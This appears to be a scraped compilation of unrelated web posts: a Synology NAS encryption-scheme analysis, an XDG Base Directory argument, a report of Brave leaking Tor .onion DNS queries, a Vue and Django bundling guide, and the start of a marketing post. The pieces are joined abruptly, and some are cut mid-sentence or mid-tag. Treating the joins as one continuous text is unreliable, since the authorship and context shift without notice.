discovered that the DiskStation Software has a <a href="https://global.download.synology.com/download/Document/Software/DeveloperGuide/Package/FileStation/All/enu/Synology_File_Station_API_Guide.pdf">publicly-documented web API (pdf)</a>. At least, a <em>mostly</em> publicly documented web API – there’s no documentation for the methods to mount and unmount encrypted shares.</p><p>That web API is <em>also</em> used by the desktop software though! So it should theoretically be possible to use <a href="https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_are_browser_developer_tools">browser devtools</a> to see exactly <em>what</em> is being sent to the DiskStation. 🤔</p><p>So, I clicked on all the right things in the Web UI, got to the bit where you type in the password, opened the devtools to the “Network Requests” tab, typed in <code>abc123</code> as my password, hit “send” and then watched for the requests:</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/encryption-dot-cgi.png" alt="Firefox devtools screenshot, showing a request to an ominously-named 'encryption.cgi'"><figcaption><p>hmmmmmmmmmmm</p></figcaption></figure><p>Hmmm, that <code>encryption.cgi</code> looks a little ominous. I wonder what’s in it?</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/public-key.png" alt="Firefox devtools screenshot, showing huge blob of base16-encoded public-key"><figcaption><p>Yep, looks like encryption, alright</p></figcaption></figure><p>Ok, a public key. And then the web interface loads a spinner, and makes a request to <code>entry.cgi</code>. Let’s take a look at the contents of that request:</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/ciphertext.png" alt="A devtools screenshot, showing a jumbled blob of base64-encoded data with the phrases 'rsa' and 'aes' sprinkled throughout."><figcaption><p>HMMMMMMMMMMMMMMMM</p></figcaption></figure><p>Ok, so if we want to send a magic request to mount the encrypted share, it’s not going to be enough to supply the encryption password; we’re also going to need to figure out how to <em>correctly</em> supply it – how to <em>encrypt</em> the encryption password, so to speak.</p><h2 id="so-what-is-this-crypto-system">So, what is this crypto system?</h2><p>Right. Here’s a high-level overview:</p><ul><li>First, we fetch the <code>public_key</code> from the server. That’s the call to the <code>encryption.cgi</code> endpoint we saw earlier. This isn’t actually the entire public key, it’s only <em>part</em> of it. In fact, this is a 4096-bit integer, encoded in base-16. The <em>other</em> part of the public key is the number <code>0x10001 == 65537</code>, which is hardcoded into the JavaScript.</li><li>Then, we generate 501 bytes worth of random text from the charset <code>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*()_+-/</code> (that’s 77 different possible characters; I have no idea why this set was chosen though!).</li><li>We encrypt that random text using our public key. The encryption method is <a href="https://tools.ietf.org/html/rfc3447#section-7.2">RSA with PKCS1.5 padding</a>.</li><li>We MD5-hash that random text a bunch of times with an 8-byte salt. The end result of this is 48 bytes which certainly <em>look</em> pretty random to the naked eye.</li><li>We split those 48 bytes into two components – a 32-byte (== 256-bit) key, and a 16-byte initialisation vector.</li><li>Remember the password we typed in? Yeah, I’d forgotten about it too! But now, we <em>finally</em> take that password, and encrypt it with AES in Cipher Block Chaining (CBC) mode with PKCSv7 padding, using the 256-bit key and 16-byte IV we derived in the previous step.</li><li>We bundle the RSA ciphertext, the 8-byte salt, and the AES ciphertext together and ship them across to the DiskStation.</li></ul><p>Still with me? It’s ok if that didn’t all make loads of sense yet; we’ll now go over the interesting bits more closely.</p><h3 id="symmetric--asymmetric-ciphers">Symmetric / Asymmetric Ciphers</h3><p>Fundamentally, we’re using two cryptographic algorithms in concert:</p><ul><li><strong>RSA</strong>: RSA is an <em>asymmetric</em> cryptographic algorithm. Asymmetric cryptographic systems have two <em>keys</em> – a public key, which allows only for encryption of the data, and a private key, which allows for both encryption <em>and</em> decryption.</li><li><strong>AES</strong>: AES is a <em>symmetric</em> cryptographic algorithm. In symmetric cryptography, all parties have the same key, and that key allows you to both encrypt and decrypt.</li></ul><p>It seems weird that we’re using both of these at the same time, right? But both systems have weaknesses, and mixing them together is an attempt at minimising the disadvantages of both schemes.</p><p>The problem with <em>symmetric</em> crypto systems by themselves is that you need a way to get that one key to every party that needs it. But you can’t just <em>send</em> it to them, because you don’t have a secure channel yet! Your options are:</p><ul><li>Share the key over a different trusted channel beforehand, or</li><li>have both parties derive the same shared key (from e.g. some partial data that they negotiate over the wire beforehand).</li></ul><p>Asymmetric crypto doesn’t have this problem – if you’re able to share a key that can only be used for encrypting and not for decrypting, then the decryption keys never have to leave the recipient machine. You can then encrypt some text, and nobody except for the recipient can decrypt it – not even you! Put it on the internet, write it on a banner attached to the back of a propeller plane – the message will only be readable by the intended recipient.</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/your-ciphertext-here.jpg" alt="A propeller plane with a banner reading 'your ciphertext here'"></figure><p>Asymmetric cryptography is <em>slow</em>, though, so doing it for lots of data is going to really hurt performance.</p><p>A common solution is to simply <em>make up</em> a symmetric key, perform some symmetric encryption using that key, then encrypt <em>that</em> key using asymmetric cryptography, and deliver both to the remote party. Then, the remote party can:</p><ul><li>First, perform asymmetric decryption to obtain the symmetric key</li><li>Then, use that symmetric key to decrypt the rest.</li></ul><p>That’s what <em>this</em> particular system is doing. ✨</p><h3 id="a-quick-note-about-rsa">A quick note about RSA</h3><p>I don’t know much about how RSA works, but as part of researching this article I discovered that it’s pretty easy to implement badly, and <a href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/">extremely difficult to implement well</a>.</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/rsa-correct.gif" alt="Two developers correctly implement RSA, 2010, colorised"><figcaption><p><a href="https://www.youtube.com/watch?v=vPwzHm6buB8">Two developers correctly implement RSA</a>, 2010, colorised</p></figcaption></figure><p>As software developers, we spend a lot of time shipping things once they get to a point of “it looks like it works”. <strong>You can’t take that approach with cryptography</strong>, and because everything is so opaque, it’s a lot easier to declare that your implementation works without realising that it’s missing fundamentals. Like correctness, for example.</p><h3 id="lets-talk-about-random-keyslets-talk-about-you-and-me">Let’s talk about random keys<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></h3><p>Recall that this algorithm is generating 501 random bytes from a 77-character set, and encrypting that with RSA. 501 seemed like an oddly specific number to me; here’s the specific set of circumstances that characterise <em>why</em> we’re generating a string of this length.</p><p>RSA is a <a href="https://en.wikipedia.org/wiki/Block_cipher"><em>block cipher</em></a>, which means it operates on distinct fixed-size blocks of input and produces fixed-size blocks of output. How big can each block be? Well, RSA public keys are made up of two numbers: a (very large) modulus <code>n</code>, and a much smaller exponent <code>e</code>. RSA is capable of encrypting any message that’s smaller than <code>n</code> if you convert it to a number. In our case, we said that our modulus was a seemingly-random 4096-bit integer – that means (approximately) that we can encrypt 512-byte blocks.</p><p>There’s an important implication here: if you don’t have enough input for a block, you need to fill it up somehow. Normally this is called a <em>padding scheme</em><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> in block-based cryptography.</p><p>Now, the system on this NAS in particular uses <a href="https://tools.ietf.org/html/rfc3447#section-7.2.1">PKCS1-v1.5 padding</a>, which prepends the message (before encryption) with 3 bytes of headers <em>plus</em> a minimum of 8 bytes<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> of random garbage. That makes 11 bytes out of a 512 byte block, which means we’ve got… 501 bytes left for our message. ✨</p><h3 id="lo-fi-key-derivation">Lo-fi key derivation</h3><p>So… we’ve got this 501-byte string, with each character being one of 77 possibilities, and we think we know <em>why</em> it was chosen to be 501 bytes long. But that’s not going to work for AES-encrypting the password:</p><ul><li>AES requires a key size of 128, 192, or 256 bits. That’s 16, 24, or 32 bytes respectively, but we’ve got <em>lots</em> more than that.</li><li>We can’t, however, just take a subset of bytes from the text and go from there – because they’re selected from a narrow subset of possible bytes (77 out of 255!), you’d be losing an <em>enormous</em> amount of entropy in the key, making the encrypted text about 44,000,000,000,000,000 times<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> easier to break.</li></ul><p>These constraints need to be managed. We can smooth over both by applying a <a href="https://en.wikipedia.org/wiki/Key_derivation_function">key derivation function</a>, based on repeated rounds of MD5 hashing and concatenating. Hash algorithms, in general, are good for this because they map input data to… not random, but random-<em>looking</em> output data.</p><p>I like to think of hashing as “entropy laundering” – if you’ve got 256 bits of entropy in a 16kB file, taking the first 256 bits will give you only 64 bits of entropy. If you hash the whole 16kB file, then the entropy goes back up to the maximum of the entropy in the file and the entropy provided by the hash algorithm. This works because hash algorithms are designed to exhibit an <a href="https://en.wikipedia.org/wiki/Avalanche_effect">avalanche effect</a>.</p><p>I do <em>not</em> have the tools or experience to evaluate whether this specific scheme is secure or not (this one seems esoteric, and the <a href="https://security.stackexchange.com/questions/19906/is-md5-considered-insecure">use of MD5 is scary</a>!)… so let’s move briskly on.</p><h3 id="aes-encryption">AES-encryption</h3><p>Finally, after a bunch of outdated and somewhat esoteric primitives, we’re back to something that is <em>good</em> and <em>works</em> and <em>only slightly</em> a <a href="https://en.wiktionary.org/wiki/footgun">loaded footgun</a> and is <em>still recommended for widespread use!</em> It’s AES with a 256-bit key.</p><p>AES is our symmetric cipher. Like RSA, it operates on blocks of fixed length. <a href="https://crypto.stackexchange.com/questions/66314/whats-the-best-block-cipher-mode-of-operation-for-rsa/66321#66321">Unlike RSA</a>, these blocks can be chained together. The strategies to do this are called <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">“Block cipher modes of operation”</a>, and AES implementations ship with a number of them. The problem is, this means you have access …</p></div></div>

The dotfiles contain data that doesn't belong to me: it belongs to the programmers whose programs decided to hijack the primary location designed as a storage for my personal files. I can't place those dotfiles anywhere else and they will appear again if I try to delete them. All I can do is sit here knowing that in the darkness, behind the scenes, they are there. Waiting in silence. Some of those programmers decided to additionally place some normal files and directories in the same place. Those are clearly visible every time I execute <code>ls</code> in my home directory. It is beyond me why my home directory ended up up containing a <code>node_modules</code> directory, <code>package-lock.json</code>, a <code>yarn.lock</code> file (I have never even consciously used yarn!), some 2 strange log files origination from some Java software clearly using an H2 database, and a <code>Desktop</code> directory. That last one has been created by Steam, which is quite unfortunate as I simply do not have a desktop or a desktop environment on my machine. I dread the day in which I will hear a loud knock on my door and one of those programmers will barge in informing me that he is going to store a piece of his furniture in the middle of my living room, If I don't mind.</p> <p>To those of you reading this: I beg you. Avoid creating files or directories of any kind in your user's <code>$HOME</code> directory in order to store your configuration or data. This practice is bizarre at best and it is time to end it. I am sorry to say that many (if not most) programs are guilty of doing this while there are significantly better places that can be used for storing per-user program data.</p> <p>Even if we will never be able to solve this problem - due to the historical baggage, backward compatibility, software no longer receiving updates or programming villains storing the files wherever they want just to see the world burn - we can at least try to follow some sane practices. While the <a href="https://plus.google.com/+RobPikeTheHuman/posts/R58WgWwN9jp">mistake of introducing the mere concept of a "hidden" file</a> can't be undone anymore, we can at least try to mitigate its results.</p> <p>This particular problem has been noticed and solved a long time ago with the creation of <a href="https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html">XDG Base Directory Specification</a>. The specification defines a set of environment variables pointing programs to a directory in which their data or configuration should be stored. It is up to the user to set those variables so if the variables are not available the programs are expected to default to a directory defined by the standard and not the user's home directory.</p> <h2>User-level variables</h2> <h3><code>$XDG_DATA_HOME</code></h3> <blockquote> <p><code>$XDG_DATA_HOME</code> defines the base directory relative to which user specific data files should be stored. If <code>$XDG_DATA_HOME</code> is either not set or empty, a default equal to <code>$HOME/.local/share</code> should be used. </p> </blockquote> <p>Example usage: storing plugins downloaded by the user, databases created by your program, user's input history, bookmarks, emails, and so on.</p> <h3><code>$XDG_CONFIG_HOME</code></h3> <blockquote> <p><code>$XDG_CONFIG_HOME</code> defines the base directory relative to which user specific configuration files should be stored. If <code>$XDG_CONFIG_HOME</code> is either not set or empty, a default equal to <code>$HOME/.config</code> should be used. </p> </blockquote> <p>You should use this directory to store user-specific configuration files for your program. You will most likely want to create a default configuration file with sane and sensible default values the first time your program is executed.</p> <h3><code>$XDG_CACHE_HOME</code></h3> <blockquote> <p><code>$XDG_CACHE_HOME</code> defines the base directory relative to which user specific non-essential data files should be stored. If <code>$XDG_CACHE_HOME</code> is either not set or empty, a default equal to $HOME/.cache should be used.</p> </blockquote> <p>Example: caching thumbnails generated by your file manager, songs that the user of a music straming software is often listening to, and so on. Your program should continue to function without any problems if this directory is removed by the user. Ensure that the files that are no longer needed are properly removed. Remember that exceeding the sensible amount of storage space used by your files will most likely upset the user who will quickly track down your program as a culprit.</p> <h3><code>$XDG_RUNTIME_DIR</code></h3> <blockquote> <p><code>$XDG_RUNTIME_DIR</code> defines the base directory relative to which user-specific non-essential runtime files and other file objects (such as sockets, named pipes, ...) should be stored.</p> </blockquote> <p>The specification lists a series of requirements that have to be fulfilled by this directory. As described by the specification you should use this directory to store sockets and similar files used for communication.</p> <h2>System-level variables</h2> <h3><code>$XDG_CONFIG_DIRS</code></h3> <blockquote> <p><code>$XDG_CONFIG_DIRS</code> defines the preference-ordered set of base directories to search for configuration files in addition to the <code>$XDG_CONFIG_HOME</code> base directory. The directories in <code>$XDG_CONFIG_DIRS</code> should be seperated with a colon ':'.</p> <p>If <code>$XDG_CONFIG_DIRS</code> is either not set or empty, a value equal to <code>/etc/xdg</code> should be used. </p> </blockquote> <p>This directory should be used for storing system-wide configuration files that can be overwriten by user-specific configuration files. This directory would most likely be populated during the installation process.</p> <h3><code>$XDG_DATA_DIRS</code></h3> <blockquote> <p><code>$XDG_DATA_DIRS</code> defines the preference-ordered set of base directories to search for data files in addition to the <code>$XDG_DATA_HOME</code> base directory. The directories in <code>$XDG_DATA_DIRS</code> should be seperated with a colon ':'.</p> <p>If <code>$XDG_DATA_DIRS</code> is either not set or empty, a value equal to <code>/usr/local/share/:/usr/share/</code> should be used.</p> </blockquote> <p>Example: storing plugins or themes that can be used by all users of your program. This directory would most likely be populated during the installation process.</p> <h2>How does this work in practice?</h2> <p>Using the standard is very simple. Read the relevant environment variable and use the default paths defined by the standard if it is missing. You should then append a program-specific directory name to it and create the entire directory tree to store your data.</p> <p>As an example if you were to store configuration files you should use <code>$XDG_CONFIG_HOME/your-program</code> as your base configuraion directory instead of just storing your files directly in <code>$XDG_CONFIG_HOME</code>. Remember to never hardcode the directories to the default values defined by the standard. Read the environment variable first to allow the user to move those directories if needed.</p> <p>You can easily migrate your existing programs to use this standard. In order to do so start using the standard when creating new files but keep also checking the old location of the files when reading them. This will allow you to migrate without breaking the program for the users with the configuration or data files that were created by a previous version of your program.</p> <p>Read the standard to find out more and have a look at the directory hierarchy which is almost certain to be already present in your home directory. In reality a cross-platform library allowing you to get a directory for storing your data will be available for your programming language of choice. On Linux and similar systems, this library will surely use the XDG Base Directory Specification.</p> <p> 2019-02-01 </p> </div> </div></div>]]>

February 19, 2021 | https://ramble.pw/f/privacy/2387/brave-browser-leaks-your-tor-onion-service-requests-through | <a href="https://web.archive.org/web/*/https://ramble.pw/f/privacy/2387/brave-browser-leaks-your-tor-onion-service-requests-through">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div lang="en" dir="ltr"><p>Edit: (Since this is gaining traction elsewhere.) I'm not trying to shit on Brave. I'm just wanting to help protect end-users who may use Brave for it's Tor feature to do stuff over Tor that should only be done with the actual Tor browser. If you're using Brave you probably use it because you expect a certain level of privacy/anonymity. Piping .onion requests through DNS where your ISP or DNS provider can see that <em>you</em> made a request for an .onion site defeats that purpose.</p>
<p>I'm also no NetSec expert but you don't have to be to replicate this. I'm just a dude with some websites and projects and I'm not certain I would have taken notice of this if it wasn't reported to me by a partner on another project who witnessed this behavior when monitoring his local requests leaving his network. He'll be doing his own write-up and is more equipped to discuss this in length than me.</p>
<hr><p>Testing out something that was noted a week or so ago, and wanting to replicate it for the purpose of this post.</p>
<p>Some of you know I'm working on an ad, tracker, and other BS blocking VPN service for an unrelated project to this site. Go to <a href="https://ramble.pw/f/incoghost">/f/incoghost</a> (<a href="https://incog.host/" rel="nofollow">website</a>) for more because I try to keep these things separated.</p>
<p>Anyhow, it was reported by a partner that Brave was leaking DNS requests for onion sites and I was able to confirm it at the time. Decided to spin up a VM with Brave and test with this site's Onion service (though it will do this for any .onion)</p>
<p>Example:</p>
<pre><code> Feb 18 12:02:25: query[A] rambleeeqrhty6s5jgefdfdtc6tfgg4jj6svr4jpgk4wjtg3qshwbaad.onion from 104.244.xx.xxx
</code></pre>
<p>What this entry shows (simply) is that the request made for the domain rambleeeqrhty6s5jgefdfdtc6tfgg4jj6svr4jpgk4wjtg3qshwbaad.onion made it to the DNS server and is tagged with the IP of the requester, which in this case is just the test / dev VPN. This shouldn't happen. There isn't any reason for Brave to attempt to resolve a .onion domain through traditional means as it would with a regular clearnet site.</p>
<p>This is especially worrisome for those of you who use Brave browser from your normal residential IP and (for whatever reason) use the Tor feature built into the browser to access Tor sites. Your ISP or DNS provider <em>will</em> know that a request made to a specific Tor site was made by <em>your</em> IP. With Brave, your ISP would know that you accessed <em>somesketchyonionsite.onion</em> .</p>
<p>TL;DR: If you're going to use Tor, use the Tor Browser and not Brave. The Tor browser itself doesn't leak these requests like Brave does.</p>
<hr><p>Edit: To clarify, the VPN service we're working on is no-logging but during this dev and testing period we're logging DNS requests while we work out the kinks in the blocklists. This has also allowed us to witness .onions being passed through which is a fault of Brave.</p>
<hr><p>Edit 2: Screenshot: <a href="https://images2.imgbox.com/98/46/1i084PbC_o.png" rel="nofollow">https://images2.imgbox.com/98/46/1i084PbC_o.png</a></p>
<p>That was me loading duckduckgo in a different container, with brave, while live fetching DNS requests made to the DNS server. I blurred out the non-onion requests. (Different VPN test location than in the above example so 209.x.x.x IP instead of the 104.x.x.x one in the original example.</p>
<hr><h3>EDIT 2: The mods of /r/privacy won't let this be posted. They say:</h3>
<blockquote>
<p>While we (vastly) prefer the Tor Browser over the Brave one, you'll need a better source than the one you found. Can you find something from a more widely recognized NetSec expert? Something along the lines of Bruce Schneier's blog or something at that level of credibility?</p>
</blockquote>
<p>and</p>
<blockquote>
<p>The problem with screenshots is that they can be faked, trivially. There are also a host of approaches that credible writers/reporters do in the NetSec space do before a line of text appears in print. It's this kind of journalism that we have to trust, since we humble Mods don't have the time or resources to vet. So, we'll need something better sourced. Sorry!</p>
</blockquote>
<p>and</p>
<blockquote>
<p>There are new posts everyday "warning" people of things that aren't legitimate, hence the caution. This is not a "security" subreddit. A moderator's job is to ensure that the subreddit doesn't devolve into conspiracy theories and misinformation. Security announcements should be vetted and confirmed, not independent claims that the mods have no time to independently verify.</p>
<blockquote>
<p>I can post the steps on how to easily replicate this by using pi-hole on their local networks. Anyone is capable of verifying this.</p>
</blockquote>
<p>Great. Please do so on r/brave, r/netsec, r/infosec, and other places where this is both directly relevant and appropriate to seek others confirmation. Once vetted by the community (and republished by professionals), you're welcome to post those official responses.</p>
</blockquote>
<p>/r/brave is private, invite only. I posted on netsec and infosec so we'll see. I guess /r/privacy must love Brave and not allow anything against it since it's so god damned easy to verify this...</p>
<p>All you have to do to VERIFY that this is happening is A.) Use Brave B.) Go to an Onion site C.) Observe DNS traffic. Install Pi-Hole on a Raspberry Pi or in a Virtual Machine on your desktop and run your DNS requests through it for ease of use and you can verify it. Not sure why they're so hesitant to inform their subscribers of this.</p>
<hr><p>Edit 3: Tested on both a Debian 10 and Ubuntu desktop. I'm not esteemed NetSec researcher and I'm not setting up a 100 different scenarios.</p>

February 19, 2021 | https://dafoster.net/articles/2021/02/16/building-web-apps-with-vue-and-django-the-ultimate-guide/ | <a href="https://web.archive.org/web/*/https://dafoster.net/articles/2021/02/16/building-web-apps-with-vue-and-django-the-ultimate-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    
    
    




<p><a href="https://vuejs.org/v2/guide/">Vue</a> and <a href="https://www.djangoproject.com/">Django</a> are both fantastic for building modern web apps - bringing declarative functional reactive programming to the frontend, and an integrated web app platform, ecosystem, and battle-hardened ORM to the backend. However they can be somewhat tricky to use <em>together</em>.</p>

<p>Here I’d like to show some approaches for setting Vue and Django up in combination for both new web apps and existing Django-based web apps. I’ve been building web apps with Django for ~6 years and with Vue for ~3 years, and in particular I’ve extensively tested the <a href="#1-server-approach">1‑server</a>&nbsp;<a href="#concatenated-bundling">concatenated bundling</a> approach described below in production.<br clear="both"></p>





<p>The first question to consider when planning to use Django and Vue together is whether to use a single server that serves both backend endpoints and frontend assets, or to use two different servers, one to host the frontend and a separate “API server” to host the backend.</p>

<p><a href="https://dafoster.net/assets/2021/vue-and-django/1-server-vs-2-server.svg">
    <img alt="Diagram: 1-server vs 2-server setup" src="https://dafoster.net/assets/2021/vue-and-django/1-server-vs-2-server.svg">
</a></p>

<p>Factors in favor of a 1-server setup:</p>

<ul>
<li><strong>Operational maintenance costs</strong> are significantly simplified with only a single server to deploy, monitor, and manage.</li>
<li>Relegating Django’s role to only that of an API server - in the 2-server setup - will complicate or even prevent you from using any <strong>Django features or third-party apps that rely on server-side rendering by Django</strong>, such as its famous built-in administration interface. Instead you’ll be doing most of your server-side rendering with some JavaScript framework that is Node-compatible. And Node-based server-side rendering is generally rather complex to setup.</li>
</ul>


<p>Factors in favor of a 2-server setup:</p>

<ul>
<li>If you want to use the latest and greatest version of JavaScript, with transpilation and module bundling, the 2-server setup has <strong>great community documentation for setting up a frontend server and build pipeline that supports all of these new JavaScript features</strong>.

<ul>
<li>However most of those features can <em>still</em> be obtained in a single-server setup with some effort, as described later in this article.</li>
</ul>
</li>
<li>If your organization already has <strong>separate frontend and backend teams</strong>, it may be easier to have 2 servers - one managed by the frontend team, and one managed by the backend team - to allow each team to focus on each server separately (and satisfy Conway’s Law <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> 🙂).</li>
<li>If your organization already has a <strong>separate operations team</strong> that has the capacity to manage the additional server implied by a 2-server setup, then the additional operational overhead may be acceptable.</li>
</ul>


<p>At my company we went with the single server option because our engineering team is small (&lt; 5 engineers) - so we care a lot about minimizing operational overhead - and is composed of full-stack generalists who are familar with both backend and frontend technologies - so we have engineers that can work anywhere in the stack but aggressively prefer <em>simple</em> architechures that don’t require extreme specialization in multiple domains.</p>

<p>In the next section I’ll drill down into the 1-server approach, but you can also skip to the <a href="#2-server-approach">2-server approach</a> if that’s what you’re leaning toward.</p>





<p>When using a single server, you’ll need to:</p>

<ul>
<li>pick an asset <a href="#bundling-strategy">bundling strategy</a>,</li>
<li><a href="#render-baseline-html-with-django">render SEO-friendly HTML server-side</a> with critical navigation and content available immediately on page load, and</li>
<li><a href="#enhance-baseline-html-with-vue">enhance that HTML client-side with Vue after page load</a> with additional dynamic content.</li>
</ul>




<h2>Bundling strategies</h2>

<p>When using a single integrated Django server to not only host your backend but also serve your frontend, you’ll need to decide how you want to bundle your JavaScript assets on the frontend together. <strong>Bundling of some kind is necessary for a production deployment</strong> that is fast enough to be mobile-friendly and usable by distant international customers who may not have fast network connectivity to your server.</p>

<p>There are multiple bundling techniques that can be used with Django, with various pros and cons:</p>

<ul>
<li><a href="#concatenated-bundling">Concatenated Bundling</a>,</li>
<li><a href="#import-traced-bundling">Import-Traced Bundling</a>, and</li>
<li><a href="#transpiled-bundling">Transpiled Bundling</a>.</li>
</ul>




<h3>Concatenated Bundling</h3>

<p><a href="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/concatenated.svg">
    <img alt="Diagram: Concatenated Bundling Strategy" src="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/concatenated.svg">
</a></p>

<p>This is by far the easiest bundling technique to use with Django and is a good technique to start with.</p>

<p>With concatenated bundling, you write JavaScript files that consist entirely of top-level function definitions and other non-executable code. Your HTML template served by Django contains <code>&lt;script&gt;</code>-includes of every JavaScript file that the current page requires, directly or transitively. And after all JavaScript files are included the HTML page uses an inline <code>&lt;script&gt;</code> to call the root JavaScript function which sets up the rest of the page:<br clear="both"></p>

<pre><code>&lt;!-- todo/templates/todo/todo.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;...&lt;/head&gt;
&lt;body&gt;...&lt;/body&gt;
{% compress js %}
    &lt;script src="{% static 'todo/todo.js' %}"&gt;&lt;/script&gt;
    &lt;script src="{% static 'todo/todo/list.js' %}"&gt;&lt;/script&gt;
    &lt;script src="{% static 'todo/todo/item.js' %}"&gt;&lt;/script&gt;
    &lt;script&gt;
        setupTodoPage();
    &lt;/script&gt;
{% endcompress %}
&lt;/html&gt;
</code></pre>


<blockquote><p>Note: The <code>{% compress js %}</code> tag above assumes that you are using the excellent <a href="https://django-compressor.readthedocs.io/en/stable/">Django Compressor</a> library which integrates well with Django as your concatenating bundler.</p></blockquote>

<p>Pros of concatenated bundling:</p>

<ul>
<li><strong>Very easy to setup.</strong> Leverages excellent documentation from the Django Compressor library.</li>
<li><strong>Zero bundle build times during development.</strong></li>
<li>Fastest bundle build times during deployment, compared with other approaches.<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></li>
</ul>


<p>Cons of concatenated bundling:</p>

<ul>
<li>You must manage your JS dependencies in HTML manually:

<ul>
<li>Whenever adding a new JS module you must remember to add it to the HTML for the appropriate page(s).</li>
<li>If you alter an existing JS module to depend on a new JS module, you must find all page HTMLs that include the first module and update them to include the second module if needed.</li>
<li>If you want to avoid managing JS dependencies manually, consider <a href="#import-traced-bundling">import-traced bundling</a> instead.</li>
</ul>
</li>
<li>JavaScript files are not transformed or transpiled in any way, so if you want to use newer JavaScript features that aren’t supported by your customers' browsers then you’re out of luck. If you need transpilation consider the <a href="#transpiled-bundling">transpiled</a> or the <a href="#2-server-approach">2-server</a> approaches instead.</li>
<li>It is awkward to define a class in a JavaScript module that inherits from a base class in a different module, because that <em>requires</em> <code>&lt;script&gt;</code>-including the base class’s module first, breaking the usual rule that “the order that JS files are imported should not matter”. (However if you just limit inheritance to be within a single module or avoid it entirely, then this restriction doesn’t matter in practice.)</li>
</ul>


<p>Note that choosing concatenated bundling does <em>not</em> prevent you from using TypeScript-based type checking in your JS files, which I <em>do</em> recommend for long-lived projects. In short, you can put a special <code>// @ts-check</code> comment at the top of a JS file to <a href="https://www.typescriptlang.org/docs/handbook/intro-to-js-ts.html">enable type-checking of JS with the TypeScript compiler</a> (<code>tsc</code>). <!-- Using TypeScript to type-check JS files doesn't seem like a very-well known technique, so I plan to write a future article about it. --></p>



<h3>Import-Traced Bundling</h3>

<p><a href="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/import-traced.svg">
    <img alt="Diagram: Import-Traced Bundling Strategy" src="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/import-traced.svg">
</a></p>

<p>With the advent of the <a href="https://www.snowpack.dev/">Snowpack</a> bundler we can get all the benefits of the <a href="#concatenated-bundling">concatenated bundling</a> approach while eliminating the need to manage JS dependencies manually, at the cost of a slightly-more-complex deployment process.</p>

<p>With import-traced bundling, you write a root JavaScript file for each page that uses regular <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import">JavaScript import statements</a> to bring in related modules. Your HTML template then only needs to include the root JavaScript file:<br clear="both"></p>

<pre><code>&lt;!-- todo/templates/todo/todo.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;...&lt;/head&gt;
&lt;body&gt;...&lt;/body&gt;
&lt;!-- js --&gt;
    &lt;script type="module"&gt;
        import { setupTodoPage } from "{% static 'todo/todo.js' %}";
        setupTodoPage();
    &lt;/script&gt;
&lt;!-- endjs --&gt;
&lt;/html&gt;
</code></pre>


<p>The root JavaScript file might look like:</p>

<pre><code>// static/todo/todo.js
import { defineTodoList } from "./todo/list.js";

export function setupTodoPage() {
    defineTodoList();
    ...
}
</code></pre>


<p>And that root JS file can include other modules like:</p>

<pre><code>// static/todo/list.js
import { defineTodoItem } from "./item.js";

export function defineTodoList() {
    defineTodoItem();
    
    Vue.component('todo-list', {
        props: {
            ...
        },
        template: `
            ...
        `,
        methods: {
            ...
        }
    });
}
</code></pre>


<p>Some key differences between import-traced bundling and concatenated bundling:</p>

<ul>
<li>The HTML page only needs to include the root JS file for the page and not any of its indirect JS dependencies.</li>
<li>JS modules must use <code>import</code> to declare other JS modules that they depend on, and <code>export</code> any functions that they want to be importable by other modules.</li>
<li>JS files for <em>all</em> Django apps in the Django project should be put in a common <code>static</code> directory rather than using per-app <code>static</code> directories. Having a common directory for all JS files will make it easier to configure Snowpack to build combined JS bundles for production deployments.</li>
<li>There is no longer a need to use Django Compressor.</li>
</ul>


<p>For a production deployment, you’ll need to alter your deployment script to run Snowpack on the root <code>static</code> directory for the Django project, enumerating the set of root JS files, and generating same-named files for deployment to your static asset server.</p>

<p>Pros of import-traced bundling:</p>

<ul>
<li><strong>Easy to setup for development.</strong> (Trickier to setup for deployment.)</li>
<li><strong>Zero bundle build times during development.</strong></li>
<li>Fast bundle build times during deployment.</li>
<li><strong>JS dependencies are automatically managed</strong> through regular <code>import</code> statements in JS.</li>
</ul>


<p>Cons of import-traced bundling:</p>

<ul>
<li>JavaScript files are not transpiled at <em>development time</em> (although they <em>are</em> at deployment time), so if you want to use the most bleeding-edge JavaScript features that aren’t even supported by your development browser then you’re out of luck. If you need transpilation during development consider the <a href="#transpiled-bundling">transpiled</a> or the <a href="#2-server-approach">2-server</a> approaches instead.</li>
<li>Requires that your development browsers <a href="https://caniuse.com/mdn-javascript_statements_import">support JavaScript import</a> and JS modules in general.</li>
</ul>




<h3>Transpiled Bundling</h3>

<p><a href="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/transpiled.svg">

<h2>Docs, Problems, and Packages Can Boost Your Lead Generation Efforts By 30%</h2>

<p>When we began building our SaaS product Ayrshare, an API that connects to social networks for posting, we strongly felt that we would not be able to tap into our core target market if we only focused on the traditional marketing route. You know, the same Google ads, general SEO, and blog posts.</p>
